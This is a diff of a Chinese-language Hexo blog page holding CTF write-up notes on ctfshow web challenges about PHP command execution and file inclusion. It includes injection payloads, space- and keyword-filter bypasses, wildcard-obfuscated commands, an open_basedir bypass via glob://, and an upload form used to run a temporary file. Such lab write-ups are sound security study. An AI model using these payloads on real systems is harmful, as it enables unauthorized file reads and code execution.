@@ -145,6 +145,207 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-12 09:38:07" itemprop="dateCreated datePublished" datetime="2022-03-12T09:38:07+08:00">2022-03-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/" class="post-title-link" itemprop="url">命令执行2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-08 23:58:51" itemprop="dateCreated datePublished" datetime="2022-03-08T23:58:51+08:00">2022-03-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-12 00:11:29" itemprop="dateModified" datetime="2022-03-12T00:11:29+08:00">2022-03-12</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="57-利用（）取反构造数"><a href="#57-利用（）取反构造数" class="headerlink" title="57  利用（）取反构造数**"></a>57  利用（）取反构造数**</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(())输出0，数学运算</span><br><span class="line">~$(())输出~0</span><br><span class="line">$((~$(())))输出-1</span><br><span class="line">所以再这我们只需要让36个-1相加再取反</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="58-突破禁用函数"><a href="#58-突破禁用函数" class="headerlink" title="58   突破禁用函数 ***"></a>58   突破禁用函数 ***</h3><h4 id="补充知识-函数"><a href="#补充知识-函数" class="headerlink" title="补充知识  函数"></a>补充知识  函数</h4><p>首先查找flag文件的地址<code>c=print_r(scandir(&#39;./&#39;));</code>找到在当前目录下</p>
+<p>这时候考的就是谁掌握的函数多了</p>
+<p>一般都会将平时经常使用的执行命令函数禁掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如</span><br><span class="line">c=phpinfo();</span><br><span class="line"></span><br><span class="line">c=system(&#x27;ls&#x27;);</span><br><span class="line"></span><br><span class="line">c=echo shell_exec(&#x27;ls&#x27;);    因为shell_exec没有返回值</span><br><span class="line"></span><br><span class="line">c=echo file_get_content(&#x27;index.php&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>还可以选择的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=echo file_get_contents(&#x27;flag.php&#x27;); file_get_contents() 把整个文件读入一个字符串中</span><br><span class="line">c=readfile(&quot;flag.php&quot;);             readfile() 函数读取一个文件，并写入到输出缓冲</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);    show_source() 函数对文件进行语法高亮显示。本函数是 highlight_file() 的别名</span><br><span class="line">c=print_r(file(&#x27;flag.php&#x27;));    print_r() 函数用于打印变量</span><br><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br><span class="line">c=var_dump(file(&#x27;flag.php&#x27;));  var_dump会读取类型和内容    file() 函数把整个文件读入一个数组中</span><br><span class="line">c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;//一行一行读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;//一个一个字符读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/image-20220309131959981.png" class="" title="image-20220309131959981">
+
+<p>这题可以用</p>
+<p>var_dump（file(“flag.php”);</p>
+<p>print_r(file(“flag.php”));</p>
+<p>show_resource(“flag.php”)</p>
+<p>highlight_file(“flag.php”)</p>
+<h3 id="59-相比58多禁用了"><a href="#59-相比58多禁用了" class="headerlink" title="59 相比58多禁用了"></a>59 相比58多禁用了</h3><p>file_get_contents</p>
+<p>readfile</p>
+<img src="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/image-20220309135203417.png" class="" title="image-20220309135203417">
+
+<h4 id="60-多禁用了file（）函数-有新姿势利用文件包含函数"><a href="#60-多禁用了file（）函数-有新姿势利用文件包含函数" class="headerlink" title="60 多禁用了file（）函数 有新姿势利用文件包含函数"></a>60 多禁用了file（）函数 有新姿势利用文件包含函数</h4><p>可以看一下文件包含的命令有没有禁用，然后可以使用这些命令包含一个get的参数  如</p>
+<img src="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/image-20220309221502257.png" class="" title="image-20220309221502257">
+
+
+
+<p><em>通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</em></p>
+<h4 id="61、62-、63，64、65可以使用highligh-file"><a href="#61、62-、63，64、65可以使用highligh-file" class="headerlink" title="61、62 、63，64、65可以使用highligh_file"></a>61、62 、63，64、65可以使用highligh_file</h4><p>也可以使用上面一种方法</p>
+<h4 id="66、67、-这次flag在flag。txt"><a href="#66、67、-这次flag在flag。txt" class="headerlink" title="66、67、  这次flag在flag。txt"></a>66、67、  这次flag在flag。txt</h4><p>有点意思</p>
+<img src="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/image-20220309230733446.png" class="" title="image-20220309230733446">
+
+<p>利用这个查看位置，发现没有 在往上查</p>
+<img src="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/image-20220309230926585.png" class="" title="image-20220309230926585">
+
+<img src="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/image-20220309231424218.png" class="" title="image-20220309231424218">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//下面是payload</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require_once(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="68、69-70"><a href="#68、69-70" class="headerlink" title="68、69 70"></a>68、69 70</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require_once(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="71-这里出现了替换—利用exit（）中断后面的执行"><a href="#71-这里出现了替换—利用exit（）中断后面的执行" class="headerlink" title="71  这里出现了替换—利用exit（）中断后面的执行"></a>71  这里出现了替换—利用exit（）中断后面的执行</h4><p>前提：ob_get_contents — 返回输出缓冲区的内容<br>           ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
+<p>题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);这里会将s中字母数字替代成问号</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解法</p>
+<img src="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/image-20220311125953472.png" class="" title="image-20220311125953472">
+
+<h3 id="72-出现了open-dasedir"><a href="#72-出现了open-dasedir" class="headerlink" title="72 出现了open_dasedir"></a>72 出现了open_dasedir</h3><p>补充知识：</p>
+<p>open_basedir是php.ini中的一个配置选项，==可用于将用户访问文件的活动范围限制在指定的区域。==</p>
+<p>假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。</p>
+<p>注意：用open_basedir指定的<strong>限制实际上是前缀，而不是目录名</strong>。</p>
+<p>这里利用glob协议去遍历根目录（具体产考open_basedir笔记）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo $f.&quot;    &quot; ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exit();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。</p>
+<p>DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件：</p>
+<p>foreach是一个遍历数组的函数 （￥a as $f 是将a赋值给$f,然后a指针指向下一个，f是一个数组</p>
+<p>exit（）是为了中断后面 的命令</p>
+<img src="/2022/03/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2/image-20220311150856886.png" class="" title="image-20220311150856886">
+
+
+
+<p>或者利用opendir+readdir</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=$a=&quot;glob:///*.txt&quot;;</span><br><span class="line">if($b=opendir($a))&#123;     打开目录 </span><br><span class="line">while(($file=readdir($b))!=false)  如果是txt文件就输出</span><br><span class="line">  &#123; echo &quot;$filename&quot;.$file;&#125;</span><br><span class="line"> closedir($b);</span><br><span class="line">&#125;</span><br><span class="line">exit();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>然后利用脚本来绕过（脚本在笔记中）</p>
+<h4 id="73-74"><a href="#73-74" class="headerlink" title="73 74"></a>73 74</h4>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -168,10 +369,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-03-02 01:23:40 / 修改时间：01:33:30" itemprop="dateCreated datePublished" datetime="2022-03-02T01:23:40+08:00">2022-03-02</time>
+              <time title="创建时间：2022-03-02 01:23:40" itemprop="dateCreated datePublished" datetime="2022-03-02T01:23:40+08:00">2022-03-02</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-07 00:38:02" itemprop="dateModified" datetime="2022-03-07T00:38:02+08:00">2022-03-07</time>
+              </span>
 
           
 
@@ -186,7 +393,9 @@
       
           <h1 id="命令执行绕过小技巧"><a href="#命令执行绕过小技巧" class="headerlink" title="命令执行绕过小技巧"></a>命令执行绕过小技巧</h1><h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><h3 id="windows-下"><a href="#windows-下" class="headerlink" title="windows 下"></a>windows 下</h3><blockquote>
 <p><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+<p>还可以用%0a 和%26 相当于||</p>
 </blockquote>
+<p>[(26条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/109837640">CTFSHOW]命令执行_Y4tacker的博客-CSDN博客_ctfshow 命令执行</a></p>
 <h3 id="Linux-下"><a href="#Linux-下" class="headerlink" title="Linux 下"></a>Linux 下</h3><blockquote>
 <p><code>;</code>前面和后面命令都要执行，无论前面真假<br><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
 <p><strong>“;”分号用法</strong></p>
@@ -195,7 +404,7 @@
 </blockquote>
 <hr>
 <h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%09`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$9`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%20`</span><br><span class="line">`%09</span><br><span class="line"></span><br><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%09`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$9`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%20`</span><br><span class="line">`%09</span><br><span class="line"></span><br><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">过滤了flag也可以其他姿势\ &#x27;&#x27; &quot;&quot;等等都行</span><br></pre></td></tr></table></figure>
 </blockquote>
 <hr>
 <h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
@@ -674,7 +883,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-28 12:13:26" itemprop="dateModified" datetime="2022-02-28T12:13:26+08:00">2022-02-28</time>
+                <time title="修改时间：2022-03-08 23:57:57" itemprop="dateModified" datetime="2022-03-08T23:57:57+08:00">2022-03-08</time>
               </span>
 
           
@@ -740,6 +949,66 @@
 <h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><p>继续用上题的解法</p>
 <img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220227210520291.png" class="" title="image-20220227210520291">
 
+<h3 id="web42（由于使用-dev-null而没有回显）"><a href="#web42（由于使用-dev-null而没有回显）" class="headerlink" title="web42（由于使用/dev/null而没有回显）"></a>web42（由于使用/dev/null而没有回显）</h3><pre><code>#### 解决方法通过命令分隔来隔开命令
+</code></pre>
+<p><strong>1、1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
+<p>&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以==”&gt;/dev/null”等同于”1&gt;/dev/null”==<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220302135020126.png" class="" title="image-20220302135020126">
+
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220302135059905.png" class="" title="image-20220302135059905">
+
+<h3 id="web43-在42基础上过滤了一些词"><a href="#web43-在42基础上过滤了一些词" class="headerlink" title="web43  在42基础上过滤了一些词"></a>web43  在42基础上过滤了一些词</h3><p>分析</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220302135610857.png" class="" title="image-20220302135610857">
+
+<p>解决</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220302135933607.png" class="" title="image-20220302135933607">
+
+<h4 id="44-比较简单————过"><a href="#44-比较简单————过" class="headerlink" title="44 比较简单————过"></a>44 比较简单————过</h4><h4 id="45-简单–过"><a href="#45-简单–过" class="headerlink" title="45 简单–过"></a>45 简单–过</h4><h4 id="46-其实从42开始都是考前面题的绕过知识比较简单有点问题为什么用，不可以"><a href="#46-其实从42开始都是考前面题的绕过知识比较简单有点问题为什么用，不可以" class="headerlink" title="46  其实从42开始都是考前面题的绕过知识比较简单有点问题为什么用，不可以"></a>46  其实从42开始都是考前面题的绕过知识比较简单有点问题为什么用，不可以</h4><h4 id="47-只是比前面多限制了几个查看命令吧了"><a href="#47-只是比前面多限制了几个查看命令吧了" class="headerlink" title="47 只是比前面多限制了几个查看命令吧了"></a>47 只是比前面多限制了几个查看命令吧了</h4><h4 id="48一样-tac真好用"><a href="#48一样-tac真好用" class="headerlink" title="48一样  tac真好用"></a>48一样  tac真好用</h4><h4 id="49-一样-过滤了flag也可以其他姿势-39-39-quot-quot-等等都行"><a href="#49-一样-过滤了flag也可以其他姿势-39-39-quot-quot-等等都行" class="headerlink" title="49 一样  过滤了flag也可以其他姿势\ &#39;&#39; &quot;&quot;等等都行"></a>49 一样  过滤了flag也可以其他姿势<code>\ &#39;&#39; &quot;&quot;</code>等等都行</h4><h4 id="50"><a href="#50" class="headerlink" title="50"></a>50<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220307002605714.png" class="" title="image-20220307002605714"></h4><h4 id="51-过"><a href="#51-过" class="headerlink" title="51  过"></a>51  过</h4><h4 id="52过滤了较多的空格"><a href="#52过滤了较多的空格" class="headerlink" title="52过滤了较多的空格"></a>52过滤了较多的空格</h4><img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220307122106688.png" class="" title="image-20220307122106688">
+
+<h4 id="53-换了一种题型但是没有什么特别的–过"><a href="#53-换了一种题型但是没有什么特别的–过" class="headerlink" title="53 换了一种题型但是没有什么特别的–过"></a>53 换了一种题型但是没有什么特别的–过</h4><h4 id="54-加强了正则表达式-这里使用mv改文件名"><a href="#54-加强了正则表达式-这里使用mv改文件名" class="headerlink" title="54 ==加强了正则表达式==  这里使用mv改文件名"></a>54 ==加强了正则表达式==  这里使用mv改文件名</h4><img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220307133952371.png" class="" title="image-20220307133952371">
+
+<p>这里利用mv来吧flag.php 改为a.txt，然后直接放问这个文件就可以了</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220307133822971.png" class="" title="image-20220307133822971">
+
+<h4 id="web55过滤了字母数字的解决方法-一定要看"><a href="#web55过滤了字母数字的解决方法-一定要看" class="headerlink" title="==web55过滤了字母数字的解决方法===  一定要看"></a><strong>==web55过滤了字母数字的解决方法===</strong>  一定要看</h4><p>1.、题目</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220307233504470.png" class="" title="image-20220307233504470">
+
+<h5 id="1、利用base64"><a href="#1、利用base64" class="headerlink" title="1、利用base64"></a>1、利用base64</h5><p><strong>查看文件的命令有数字开头的那就是base64</strong></p>
+<h5 id="base64的使用"><a href="#base64的使用" class="headerlink" title="base64的使用"></a>base64的使用</h5><p>我们就可以通过通配符进行匹配命令执行查看flag.<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=php&spm=1001.2101.3001.7020">php</a></p>
+<p>payload：<code>?c=/???/????64 ????.???</code><br>意思是 <code>/bin/base64 flag.php</code></p>
+<p>进bin目录是为了使用base64命令因为这个命令是在bin目录下的</p>
+<h5 id="2、利用bzip2"><a href="#2、利用bzip2" class="headerlink" title="2、利用bzip2"></a>2、利用bzip2</h5><h5 id="bzip2的使用"><a href="#bzip2的使用" class="headerlink" title="bzip2的使用"></a>bzip2的使用</h5><p><strong>bzip2是linux下面的压缩文件的命令</strong><br><code>我们可以通过该命令压缩flag.php 然后进行下载</code><br>payload：<code>?c=/???/???/????2 ????.???</code><br>也就是<code>/usr/bin/bzip2 flag.php</code><br>然后访问<code>/flag.php.bz2</code>进行下载获得flag.php</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220307234953887.png" class="" title="image-20220307234953887">
+
+
+
+<p>上面两种是过滤了字母的，还有更骚的</p>
+<h5 id="3、简直是秒到家了-一定要看"><a href="#3、简直是秒到家了-一定要看" class="headerlink" title="==3、简直是秒到家了        一定要看=="></a>==3、简直是秒到家了        一定要看==</h5><p>1、再开始之前首先构造一个post文件（或者利用postman）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、<code>然后抓包</code>如图</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDkxNDY0,size_16,color_FFFFFF,t_70#pic_center.png" class="" title="在这里插入图片描述">
+
+<p>3、</p>
+<h5 id="构造poc执行命令"><a href="#构造poc执行命令" class="headerlink" title="构造poc执行命令"></a>构造poc执行命令</h5><p><code>?c=.+/???/????????[@-[]</code><br>注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。</p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDkxNDY0,size_16,color_FFFFFF,t_70#pic_center-16466713896983.png" class="" title="在这里插入图片描述">
+
